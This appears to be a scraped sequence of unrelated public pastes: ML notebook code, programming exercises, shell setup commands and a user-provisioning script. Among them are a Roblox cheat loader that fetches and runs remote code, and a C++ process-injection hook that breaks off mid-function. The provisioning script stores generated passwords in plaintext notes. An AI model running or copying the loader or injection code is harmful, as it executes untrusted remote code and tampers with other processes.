#     [16.791838457871147,42.33482314089884,0,0],
#     [10.583694293380976,19.61926728942497,0,0],
#     [26.634447074406467,91.96624817360987,2,1],
#     [26.217868623367643,36.400293587062976,0,0],
#     [17.689396788624936,60.79797114006423,2,1],
#     [33.17193822527976,66.75277364959176,2,1],
#     [23.793952755709153,22.57501437360518,0,0],
#     [37.844484133572124,36.320623921263156,2,1],
#     [35.16135413357336,33.16395078484642,2,1],
#     [29.380894071974286,25.28297332192533,0,0],
#     [31.65893504663792,73.13603413708854,2,1],
# ]

# # Převod na NumPy pole
# A = np.array(A)

# Extrakce dat a labelů
X = A[:, :-1]  # Všechny sloupce kromě posledního jsou vstupy
y = A[:, -1]  # Poslední sloupec je label

# Normalizace dat
min_values = np.min(X, axis=0)
max_values = np.max(X, axis=0)
X_normalized = (X - min_values) / (max_values - min_values)

# Rozdělení dat na trénovací a testovací množiny
num_training_rows = len(X)
X_train_normalized = X_normalized[:num_training_rows]
y_train = y[:num_training_rows]
X_test_normalized = X_normalized[num_training_rows:]
y_test = y[num_training_rows:]

# Definice a kompilace modelu
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train_normalized[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Trénování modelu
epochs = 138
accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

# Aplikace PCA
pca = PCA(n_components=2)  # Snížení na 2 komponenty
X_pca = pca.fit_transform(X_normalized)

# Vizualizace výsledků
plt.figure()
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=y)
plt.xlabel('První hlavní komponenta')
plt.ylabel('Druhá hlavní komponenta')
plt.title('PCA na vašich datech')
plt.show()

##################### LDA

X = A[:, :-1]  # Všechny sloupce kromě posledního jsou vstupy
y = A[:, -1]  # Poslední sloupec je label

# Normalizace dat
min_values = np.min(X, axis=0)
max_values = np.max(X, axis=0)
X_normalized = (X - min_values) / (max_values - min_values)

# Rozdělení dat na trénovací a testovací množiny
num_training_rows = A.shape[0]

X_train_normalized = X_normalized[:num_training_rows]
y_train = y[:num_training_rows]
X_test_normalized = X_normalized[num_training_rows:]
y_test = y[num_training_rows:]

# # Definice a kompilace modelu
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train_normalized[0]),)),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(128, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dropout(0.3),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

#model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

from sklearn.discriminant_analysis import LinearDiscriminantAnalysis as LDA

# Trénování modelu
epochs = 138
accuracy_history = []

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

# Aplikace LDA
lda = LDA(n_components=1)  # Snížení na 2 komponenty
X_lda = lda.fit_transform(X_normalized, y)

# # Vizualizace výsledků
# plt.figure()
# plt.scatter(X_lda[:, 0], X_lda[:, 1], c=y)
# plt.xlabel('První diskriminační komponenta')
# plt.ylabel('Druhá diskriminační komponenta')
# plt.title('LDA na vašich datech')
# plt.show()

lda = LDA(n_components=1)
X_lda = lda.fit_transform(X_train_normalized, y_train)
 

# Vizualizace výsledků LDA
plt.figure()
plt.scatter(X_lda[:, 0], np.zeros_like(X_lda), c=y_train)
plt.xlabel('První diskriminační komponenta')
plt.title('LDA s učitelem')
plt.show()

###################################################################################################################


import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from sklearn.metrics import recall_score, confusion_matrix, accuracy_score, precision_score, f1_score
import seaborn as sns

# # Vaše data
# A = [
#     [23.657800719276743, 18.859916797201468, 0, 0],
#     [22.573729142097473, 17.96922325097786, 0, 0],
#     [32.55342396968757, 29.463651408558803, 0, 0],
#     [6.718035041529263, 25.704665468161718, 2, 1],
#     [14.401918566243225, 16.770856492924658, 0, 0],
#     [17.457907312962234, 21.76521470574044, 0, 0],
#     [20.02796946568093, 73.45445954770891, 2, 1],
#     [30.295138369778076, 62.901112886193246, 2, 1],
#     [15.128977804449633, 32.40267702110393, 0, 0],
#     [30.179457395820013, 58.982492125646104, 2, 1],
#     [28.01649701854089, 63.92781357637711, 2, 1],
#     [16.791838457871147, 42.33482314089884, 0, 0],
#     [10.583694293380976, 19.61926728942497, 0, 0],
#     [26.634447074406467, 91.96624817360987, 2, 1],
#     [26.217868623367643, 36.400293587062976, 0, 0],
#     [17.689396788624936, 60.79797114006423, 2, 1],
#     [33.17193822527976, 66.75277364959176, 2, 1],
#     [23.793952755709153, 22.57501437360518, 0, 0],
#     [37.844484133572124, 36.320623921263156, 2, 1],
#     [35.16135413357336, 33.16395078484642, 2, 1],
#     [29.380894071974286, 25.28297332192533, 0, 0],
#     [31.65893504663792, 73.13603413708854, 2, 1],
# ]

# # Převod na NumPy pole
# A = np.array(A)

# Rozdělení na vstupní data (X) a cílové proměnné (y)
X = A[:, :-1]
y = A[:, -1]

# Rozdělení na trénovací a testovací sadu (v tomto příkladě použijeme celou sadu jako trénovací pro jednoduchost)
X_train, y_train = X, y
X_test, y_test = X, y

# Normalizace dat
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)
X_test_normalized = (X_test - min_values) / (max_values - min_values)

# Definice modelu
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(X_train_normalized.shape[1],)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Použití Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy', tf.keras.metrics.Recall()])

# Trénování modelu
history = model.fit(X_train_normalized, y_train, epochs=50, verbose=0, shuffle=False)

# Predikce
y_pred_prob = model.predict(X_test_normalized)
y_pred = (y_pred_prob > 0.5).astype(int)

# Výpočet metrik
recall = recall_score(y_test, y_pred)
conf_matrix = confusion_matrix(y_test, y_pred)

# Vyhodnocení výkonu modelu
accuracy = accuracy_score(y_test, y_pred)
precision = precision_score(y_test, y_pred)
f1 = f1_score(y_test, y_pred)

# Výpis metrik
print(f""Recall: {recall:.4f}"")
print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""F1 Score: {f1:.4f}"")
print(f""Confusion Matrix:\n{conf_matrix}"")

# Zobrazení confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()


mu = np.mean(X_train, axis=0)
sigma = np.std(X_train, axis=0)

# Normalizace každého sloupce zvlášť
X_train_standardized = (X_train - mu) / sigma

# Pokud chcete provést stejnou normalizaci pro testovací data:
X_test_standardized = (X_test - mu) / sigma

# Výpis pro kontrolu
print(""Průměry (mu):"", mu)
print(""Směrodatné odchylky (sigma):"", sigma)"
raX1YtC9,CreateUsersSimple,Savelyev_Vyacheslav,JavaScript,Tuesday 28th of May 2024 03:33:41 PM CDT,"const employees = {
  ""dsayfulina7777@ptsecurity.com"": ""Дима Арбузов"",
};

const mailPoroler = 'poroler@mail.ru'
userAvailabilityCheck(mailPoroler, 'poroler1', 'poroler2', 'poroler3')
const poroler = new SimpleRecord('employee'); // если нет, то сначала создаем его
poroler.get('email', mailPoroler); 

// Цикл для распечатки ключей и каждого слова из значений отдельно
let first_name=''
let last_name = ''
let middle_name = ''
let count = 0
for (const email in employees) {
  if (employees.hasOwnProperty(email)) {
      const fullName = employees[email];
      const words = fullName.split("" "");
      first_name = words[0]
      last_name = words[1]
      middle_name = words[2] || ''
      ss.info(email)
      ss.info(first_name)
      ss.info(last_name)
      ss.info(middle_name)
      ss.info(""--------------------"");
      const recordID = userAvailabilityCheck(email, first_name, last_name, middle_name)
      if(!!recordID) {
        poroler.notes += `${first_name} ${last_name}: ""${generateFourDigitPassword()}""\n`
        poroler.update()
        count++
      } else {
        poroler.notes += `${first_name} ${last_name}: ""пользователь не создан""`
        poroler.update()
      }
  }
}

poroler.notes += `\n\nВСЕГО ЗАДАНО ${count} __________________________________________________________________________\n\n`
poroler.update()


function userAvailabilityCheck(email, first_name, last_name, middle_name) { // функция определения автора 
  const username = convertToLatin(`${first_name} ${last_name}`)
  const COMPANY = '168847606792543577'
  const TIME_ZONE = '156076775207685877'
  const DATE_FORMAT = '159836398502430507'
  const LANGUAGE = '156628684306200767'
  const WORK_SHEDULE = '170551520911010095'
  const user = new SimpleRecord('employee'); 
  user.addQuery('email', email); 
  user.setLimit(1);
  user.query();
  if (user.getRowCount() != 0) {
    user.next();
    user.username = username;
    user.first_name = first_name;
    user.last_name = last_name;
    user.middle_name = middle_name;
    user.email = email;
    user.company = COMPANY;
    user.timezone_id = TIME_ZONE;
    user.date_format_id = DATE_FORMAT;
    user.language_id = LANGUAGE;
    user.work_schedule = WORK_SHEDULE;
    user.update()
  }

  if (user.getRowCount() == 0) { // проверяем обращался ли пользователь до этого
    const newUser = new SimpleRecord('employee'); // если нет, то сначала создаем его
    newUser.username = username;
    newUser.first_name = first_name;
    newUser.last_name = last_name;
    newUser.middle_name = middle_name;
    newUser.email = email;
    newUser.company = COMPANY;
    newUser.timezone_id = TIME_ZONE;
    newUser.date_format_id = DATE_FORMAT;
    newUser.language_id = LANGUAGE;
    newUser.work_schedule = WORK_SHEDULE;
    
    const isInserted = newUser.insert();
    
    if (isInserted == 0) {
        ss.error(newUser.getErrors());
    } else {
        ss.info(`Создан пользователь с ID ${isInserted}`);
        return isInserted;
    }
  } else { // если есть передаем его ID для дальнейшего использования
    user.next();
    return user.sys_id;
  }
}
function convertToLatin(fullName) {
  // Разбиваем полное имя на слова
  const words = fullName.split("" "");
  
  // Преобразуем каждое слово в нижний регистр и из кириллицы в латиницу
  const latinizedWords = words.map(word => {
      // Создаем массив символов из слова
      const characters = word.split('');
      
      // Проходимся по каждому символу
      const latinizedCharacters = characters.map(character => {
          // Проверяем, есть ли кириллическая версия символа в таблице
          const cyrillicCharIndex = 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'.indexOf(character.toLowerCase());
          // Если символ найден, заменяем его на соответствующий латинский символ
          if (cyrillicCharIndex !== -1) {
              const latinChar = 'a,b,v,g,d,e,e,zh,z,i,y,k,l,m,n,o,p,r,s,t,u,f,kh,ts,ch,sh,shch,,y,,e,yu,ya'.split(',')[cyrillicCharIndex];
              // Проверяем регистр и возвращаем символ с тем же регистром
              return character === character.toLowerCase() ? latinChar : latinChar.toUpperCase();
          } else {
              // Если символ не найден в таблице кириллических символов, возвращаем его как есть
              return character;
          }
      });
      
      // Соединяем массив символов обратно в слово
      return latinizedCharacters.join('');
  });
  
  // Формируем адрес электронной почты из имени и фамилии, разделенных точкой
  const email = latinizedWords.join('.').toLowerCase();
  
  return email;
}
function generateFourDigitPassword() {
    // Генерация случайного числа от 0 до 9999
    const randomNumber = Math.floor(Math.random() * 1000000);
    // Преобразование числа в строку
    let password = randomNumber.toString();
    // Добавление ведущих нулей, если длина строки меньше 4
    while (password.length < 6) {
        password = '0' + password;
    }
    return password;
}
"
45v38JNX,Poke Mon,ikopchev,C#,Tuesday 28th of May 2024 03:13:12 PM CDT,"int powerN= int.Parse(Console.ReadLine());
int targetsM = int.Parse(Console.ReadLine());
int exhaustionY = int.Parse(Console.ReadLine());
int statusS = powerN;
int pokesP = 0;
while(targetsM<=statusS)
{
    statusS-= targetsM;
    pokesP++;
    if ((powerN/2) % 1 == 0 && statusS%1==0)
    {
        if ( powerN/2 == statusS )
    {
          statusS/=exhaustionY;
    }

    }
        
        
}
Console.WriteLine(statusS);
Console.WriteLine(pokesP);"
jnJf1fJD,11 Snow Balls,ikopchev,C#,Tuesday 28th of May 2024 03:07:36 PM CDT,"int snowballs =int.Parse(Console.ReadLine());
int snowballMaxValue = 0;
int snow = 0;
int time = 0;
int quality = 0;

for (int i = 0; i < snowballs; i++)
{
    int snowballSnow = int.Parse(Console.ReadLine());
    int snowballTime = int.Parse(Console.ReadLine());
    int snowballQuality = int.Parse(Console.ReadLine());
    int snowballValue =  (int)Math.Pow( snowballSnow / snowballTime, snowballQuality);
    if (snowballMaxValue<snowballValue)
    {
        snowballMaxValue = snowballValue;
        snow= snowballSnow;
        time = snowballTime;
        quality= snowballQuality;
    }
}
Console.WriteLine($""{snow} : {time} = {snowballMaxValue} ({quality})"");"
yNqS1VNi,How to block G2A spam in public pastes with ublock origin,kisazeky,Java,Tuesday 28th of May 2024 02:51:45 PM CDT,"! add to filter
pastebin.com##li:has-text(G2A.com)"
sjdkrMtV,Untitled,Sininerebane,C#,Tuesday 28th of May 2024 02:50:29 PM CDT,"namespace summaiumnozenie
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.InputEncoding = Encoding.UTF8;
            Random random = new Random();
            int minValue = 1;
            int maxValue = 10;
            int rowNumber = 0;
            int columnNumber = 1;
            int sumResult = 0;
            int multiplyResult = 1;
            int[,] array = new int[3, 3];

            for (int i = 0; i < array.GetLength(0); i++)
            {
                for (int j = 0; j < array.GetLength(1); j++)
                {
                    array[i, j] = random.Next(minValue, maxValue);
                    Console.Write(array[i, j] + "" "");
                }

                Console.WriteLine();
           }

            for (int j = 0; j < array.GetLength(1); j++)
            {
                sumResult += array[columnNumber,j];
            }
            
            Console.WriteLine($""Cумму второй строки: {sumResult} "");
            
            for (int i = 0; i < array.GetLength(0); i++)
            {
                multiplyResult *= array[rowNumber, i];
            }
            
            Console.WriteLine($""Произведение первого столбц: {multiplyResult} "");
            Console.ReadKey();
        }
    }
}"
KaChd7sC,byte_stuffing_demo,Python253,Python,Tuesday 28th of May 2024 02:33:05 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: byte_stuffing_demo.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
    - This script demonstrates byte stuffing and destuffing techniques in Python.
    - Byte stuffing involves the strategic insertion of special characters into a data stream.
    - This ensures reliable transmission, while byte destuffing removes these inserted characters to recover the original data.
    - The script showcases how these techniques can be implemented to enhance data integrity in network communication protocols.

Stuffing Characters Used:

    左: (Left)
    中: (Center)
    右: (Right)
    
    Note:
    - These Chinese characters are strategically inserted into the data stream to ensure synchronization and data integrity during transmission.
    - They serve as markers within the data stream and do not necessarily correspond to left, center, or right boundaries.

Requirements:
    - Python 3.x
    - colorama module (for colored output)

Functions:
    - byte_stuffing(data, stuffing_chars):
        Performs byte stuffing on the input data using specified stuffing characters.
    - byte_destuffing(data, stuffing_chars):
        Performs byte destuffing on the input data using specified stuffing characters.
    - main():
        Handles user input, performs byte stuffing and destuffing, and displays the results.

Usage:
    - Run the script in a Python 3 environment.
    - Follow the prompts to enter the string for byte stuffing and destuffing.
    - View the results of byte stuffing and destuffing.

Example Output:

     :: BYTE STUFFING AND DESTUFFING DEMONSTRATION ::
    __________________________________________________

        Enter String: This is an example string
    __________________________________________________

        The length of the entered data is: 25

        Stuffed data:
        This左 is中 an右 example左 string

        Destuffed data:
        This is an example string
    __________________________________________________

Additional Notes:
    - The colorama module is used to display colored output, requiring installation via pip.
    - The script assumes familiarity with byte stuffing and destuffing concepts in networking.
""""""

from colorama import Fore, Style

def byte_stuffing(data, stuffing_chars=[""左"", ""中"", ""右""]):
    """"""
    Perform byte stuffing on the input data.

    Args:
        data (str): The input string to be stuffed.
        stuffing_chars (list, optional): List of stuffing characters. Default is ['左', '中', '右'].

    Returns:
        str: The stuffed string.

    """"""
    stuffed_data = """"  # Initialize stuffed data
    char_index = 0

    for char in data:
        if char == "" "":
            stuffed_data += Fore.RED + stuffing_chars[char_index] + Style.RESET_ALL
            char_index = (char_index + 1) % len(stuffing_chars)
        stuffed_data += char

    return stuffed_data

def byte_destuffing(data, stuffing_chars=[""左"", ""中"", ""右""]):
    """"""
    Perform byte destuffing on the input data.

    Args:
        data (str): The stuffed string to be destuffed.
        stuffing_chars (list, optional): List of stuffing characters. Default is ['左', '中', '右'].

    Returns:
        str: The destuffed string.

    """"""
    destuffed_data = """"
    for char in data:
        if char in stuffing_chars:
            continue
        destuffed_data += char

    return destuffed_data

def main():
    """"""
    Main function to demonstrate byte stuffing and destuffing.
    """"""
    print(
        f""\n{Fore.YELLOW} :: BYTE STUFFING AND DESTUFFING DEMONSTRATION ::{Style.RESET_ALL}""
    )
    print(""_"" * 50)

    # Input data from the user
    data = input(f""\n{Fore.GREEN}    Enter String: {Style.RESET_ALL}"")
    print(""_"" * 50)
    length = len(data)
    print(
        f""\n    The length of the entered data is: {Fore.GREEN}{length}{Style.RESET_ALL}""
    )

    # Perform byte stuffing
    stuffed_data = byte_stuffing(data)
    print(""\n    Stuffed data:\n   "", stuffed_data)

    # Perform byte destuffing
    destuffed_data = byte_destuffing(stuffed_data)
    print(""\n    Destuffed data:\n   "", destuffed_data)
    print(""_"" * 50)

if __name__ == ""__main__"":
    main()
"
DyWvgvRT,clon,AleVilla96,C,Tuesday 28th of May 2024 02:25:27 PM CDT,"class Punto:
    # Constructor
    # Se usan valores estándar al construir el objeto
    def __init__(self, x=0.0, y=0.0):
        self.x = x
        self.y = y

    def __repr__(self):
        return f""Punto: x={self.x} y={self.y}""

    # Los getters se usar para obtener algún valor que existe dentro de un objeto.
    # (getter)
    def demeX(self):
        return self.x

    # (getter)
    def demeY(self):
        return self.y

    # Los setters se usan para modificar valores existente dentro de un objeto.
    # (setter)
    def modificarY(self, y):
        self.y = y

    # (setter)
    def modificarX(self, x):
        self.x = x

    def clonarNuevo(self):
        return Punto(self.x, self.y)

class Recta:
    def __init__(self, p1=Punto(0.0, 0.0), p2=Punto(0.0, 0.0)):
        self.p1 = p1
        self.p2 = p2

    def __repr__(self):
        return f'Recta({self.p1}, {self.p2})'

    def demep1(self):
        return self.p1

    def demep2(self):
        return self.p2

    def clonarRecta(self):
        np1 = self.demep1().clonarNuevo() # o self.p1.clonarNuevo()
        np2 = self.demep2().clonarNuevo() # o self.p2.clonarNuevo()
        return Recta(np1, np2)




rec1 = Recta(Punto(40000, 60000), Punto(80000, 90000))

rec2 = rec1.clonarRecta()

print(""Recta 1"")
print(rec1)

print(""Recta 2"")
print(rec2)


print(""Ids"")
print(f""Recta 1: {id(rec1.p1)}"")
print(f""Recta 2: {id(rec2.p1)}"")

print(""Comparando valores y direcciones de memoria:"")
print(f""recta1.p1 == recta2.p1: {rec1.p1.x == rec2.p1.x}"")
print(f""recta1.p1 is recta2.p1: {rec1.p1.x is rec2.p1.x}"")
print(f""recta1.p2 == recta2.p2: {rec1.p2 == rec2.p2}"")
print(f""recta1.p2 is recta2.p2: {rec1.p2 is rec2.p2}"")

print(""Comparando direcciones de memoria de los atributos x e y:"")
print(f""recta1.p1._x id: {id(rec1.p1.x)}, recta2.p1._x id: {id(rec2.p1.x)}"")
print(f""recta1.p1._y id: {id(rec1.p1.y)}, recta2.p1._y id: {id(rec2.p1.y)}"")
print(f""recta1.p2._x id: {id(rec1.p2.x)}, recta2.p2._x id: {id(rec2.p2.x)}"")
print(f""recta1.p2._y id: {id(rec1.p2.y)}, recta2.p2._y id: {id(rec2.p2.y)}"")"
44tzBgcs,Untitled,Josif_tepe,C++,Tuesday 28th of May 2024 02:14:49 PM CDT,"class Solution {
public:
string a, b;
int dp[1005][1005];
const int INF = 2e8;
int rec(int i, int j) {
    if(i == -1) {
        return 0;
    }
    if(j == -1) {
        return 0;
    }
    if(dp[i][j] != -1) {
        return dp[i][j];
    }
    int res = -INF;
    if(a[i] == b[j]) {
        res = max(res, rec(i - 1, j - 1) + 1);
    }
    res = max(res, rec(i - 1, j));
    res = max(res, rec(i, j - 1));
    return dp[i][j] = res;
}
    int longestCommonSubsequence(string text1, string text2) {
        a = text1;
        b = text2;
    vector<vector<int>> dp(a.size() + 1, vector<int>(b.size() + 1, 0));
    int res = 0;
    for(int i = 1; i <= a.size(); i++) {
        for(int j = 1; j <= b.size(); j++) {
            if(a[i - 1] == b[j - 1]) {
                dp[i][j] = max(dp[i][j], dp[i - 1][j - 1] + 1);
            }
            dp[i][j] = max(dp[i][j], dp[i - 1][j]);
            dp[i][j] = max(dp[i][j], dp[i][j - 1]);
            res = max(res, dp[i][j]);
        }
    }
    return res;
    }
};"
idkLvvmm,Untitled,Josif_tepe,C++,Tuesday 28th of May 2024 02:08:38 PM CDT,"class Solution {
public:
string a, b;
int dp[1005][1005];
const int INF = 2e8;
int rec(int i, int j) {
    if(i == -1) {
        return 0;
    }
    if(j == -1) {
        return 0;
    }
    if(dp[i][j] != -1) {
        return dp[i][j];
    }
    int res = -INF;
    if(a[i] == b[j]) {
        res = max(res, rec(i - 1, j - 1) + 1);
    }
    res = max(res, rec(i - 1, j));
    res = max(res, rec(i, j - 1));
    return dp[i][j] = res;
}
    int longestCommonSubsequence(string text1, string text2) {
        a = text1;
        b = text2;
    memset(dp, -1, sizeof dp);
        return rec(a.size() - 1, b.size() - 1);
    }
};"
9Qgjn9tk,Kroton Da Hood Rewritten,JannickP8,Lua,Tuesday 28th of May 2024 02:02:29 PM CDT,"--[[
MADE BY
    _____ _______     _______ _______ _____ _____ 
  / ____|  __ \ \   / /  __ \__   __|_   _/ ____|
 | |    | |__) \ \_/ /| |__) | | |    | || |     
 | |    |  _  / \   / |  ___/  | |    | || |     
 | |____| | \ \  | |  | |      | |   _| || |____ 
  \_____|_|  \_\ |_|  |_|      |_|  |_____\_____|
                                                 
]]--
loadstring(game:HttpGet(""https://raw.githubusercontent.com/AxtraXploits/Kroton_Rewritten/main/Kroton%20rewritten%20(2).txt""))();"
VgW9NUAz,Untitled,Vidrohi,C++,Tuesday 28th of May 2024 02:01:10 PM CDT,"#include <iostream>
#include <vector>

std::vector<int> testArr{1,2,3,4};

int main()
{
	for(size_t i = 0; i<testArr.size(); ++i)
	{
    	std::cout<<i<<""\n"";
	}
}
"
CHKS6fLu,zsh,wickedjackal,Bash,Tuesday 28th of May 2024 01:57:40 PM CDT,"echo 'deb http://download.opensuse.org/repositories/shells:/zsh-users:/zsh-syntax-highlighting/xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/shells:zsh-users:zsh-syntax-highlighting.list
curl -fsSL https://download.opensuse.org/repositories/shells:zsh-users:zsh-syntax-highlighting/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/shells_zsh-users_zsh-syntax-highlighting.gpg > /dev/null
sudo apt update
sudo apt install zsh-syntax-highlighting

echo 'deb http://download.opensuse.org/repositories/shells:/zsh-users:/zsh-completions/xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/shells:zsh-users:zsh-completions.list
curl -fsSL https://download.opensuse.org/repositories/shells:zsh-users:zsh-completions/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/shells_zsh-users_zsh-completions.gpg > /dev/null
sudo apt update
sudo apt install zsh-completions
(this didn't work for some reason)


git clone https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:-${ZSH:-~/.oh-my-zsh}/custom}/plugins/zsh-completions

fpath+=${ZSH_CUSTOM:-${ZSH:-~/.oh-my-zsh}/custom}/plugins/zsh-completions/src


sudo mkdir -p /etc/apt/keyrings
wget -qO- https://raw.githubusercontent.com/eza-community/eza/main/deb.asc | sudo gpg --dearmor -o /etc/apt/keyrings/gierens.gpg
echo ""deb [signed-by=/etc/apt/keyrings/gierens.gpg] http://deb.gierens.de stable main"" | sudo tee /etc/apt/sources.list.d/gierens.list
sudo chmod 644 /etc/apt/keyrings/gierens.gpg /etc/apt/sources.list.d/gierens.list
sudo apt update
sudo apt install -y eza


git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install


git clone https://github.com/zpm-zsh/autoenv ~/.oh-my-zsh/custom/plugins/autoenv

git clone https://github.com/Tarrasch/zsh-autoenv ~/.dotfiles/lib/zsh-autoenv
echo 'source ~/.dotfiles/lib/zsh-autoenv/autoenv.zsh' >> ~/.zshrc

curl -#fLo- 'https://raw.githubusercontent.com/hyperupcall/autoenv/master/scripts/install.sh' | sh
this is the one

echo ""source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh"" >> ${ZDOTDIR:-$HOME}/.zshrc

git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions

git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting

git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install"
nJ0nhbZp,Untitled,Josif_tepe,C++,Tuesday 28th of May 2024 01:48:28 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int INF = 2e9;
int main()
{
   int n;
   cin >> n;

   vector<int> v(n);
   vector<int> dp1(n + 1), dp2(n + 1), dp3(n + 1), dp4(n + 1);
   for(int i = 0; i < n; i++) {
    cin >> v[i];
   }
   for(int i = 0; i < n; i++) {
    dp1[i] = -INF;
    dp2[i] = -INF;
    dp3[i] = -INF;
    dp4[i] = -INF;
   }
   for(int i = n - 1; i >= 0; i--) {
    dp1[i] = max(dp1[i + 1], v[i]);
   }
   for(int i = n - 2; i >= 0; i--) {
    dp2[i] = max(dp2[i + 1], dp1[i + 1] - v[i]);
   }
   for(int i = n - 3; i >= 0; i--) {
    dp3[i] = max(dp3[i + 1], dp2[i + 1] + v[i]);
   }
   for(int i = n - 4; i >= 0; i--) {
    dp4[i] = max(dp4[i + 1], dp3[i + 1] - v[i]);
   }
   int res = -INF;
   for(int i = 0; i <= n; i++) {
    res = max(res, dp4[i]);
   }
   cout << res << endl;

    return 0;
}
"
eFfgedtA,Untitled,Josif_tepe,C++,Tuesday 28th of May 2024 01:31:37 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int INF = 2e9;
int main()
{
   int n;
   cin >> n;

   vector<int> v(n), dp(n);
   for(int i = 0; i < n; i++) {
    cin >> v[i];
    dp[i] = v[i];
   }

   for(int i = 1; i < n; i++) {
    dp[i] = max(dp[i - 1] + v[i], dp[i]);
   }
    int res = -INF;
    for(int i = 0; i < n; i++) {
        res = max(res, dp[i]);
    }
    cout << res << endl;
    return 0;
}
"
ZuNHfLGp,04. Mouse Gradient,drak138,JavaScript,Tuesday 28th of May 2024 12:56:57 PM CDT,"function attachGradientEvents() {
    //get html elements
    let gradientWrapper=document.getElementById('gradient');
    let result=document.getElementById('result')
    //add event listeners
    gradientWrapper.addEventListener('mousemove', action);
    gradientWrapper.addEventListener('mouseout', gradientOut);
    //call function
    function action(event){
        //get the box width
        let gradientWidth=event.currentTarget.offsetWidth;
        //get mouse position on gradient Box
        let positionOfTheMouse = event.offsetX / (gradientWidth - 1);
        //get percentage of the mouse X axis
        let percentage = Math.trunc(positionOfTheMouse * 100);
        
        result.textContent = percentage + ""%"";
    }
    //when mouse is outside of gradient Box make the result equal empty string
    function gradientOut() {
        result.textContent = """";
        }
}"
RXgT4KTg,R2 Hook,AkselRus,C++,Tuesday 28th of May 2024 12:52:31 PM CDT,"#include <windows.h>
#include <tlhelp32.h>
#include <detours.h>

// Адрес функции, которую будем перехватывать
#define TARGET_FUNCTION_ADDRESS 0x62019274

typedef unsigned long (__thiscall *Real_Check)(void *thisPtr);
Real_Check Original_Check = nullptr;

// Функция-хук
unsigned long __fastcall Hook_Check(void *thisPtr) {
    // Ваш код перехвата
    MessageBoxA(NULL, ""Функция перехвачена!"", ""Перехват"", MB_OK);
    return Original_Check(thisPtr);
}

DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &processEntry) == TRUE) {
        while (Process32Next(snapshot, &processEntry) == TRUE) {
            if (_stricmp(processEntry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}

void InjectAndHook(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        MessageBoxA(NULL, ""Не удалось открыть процесс"", ""Ошибка"", MB_OK);
        return;
    }

    // Аллоцирование памяти для кода хука
    LPVOID pHookCode = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pHookCode) {
        MessageBoxA(NULL, ""Не удалось аллоцировать память"", ""Ошибка"", MB_OK);
        CloseHandle(hProcess);
        return;
    }

    // Скопируем код хука в выделенную память
    SIZE_T written;
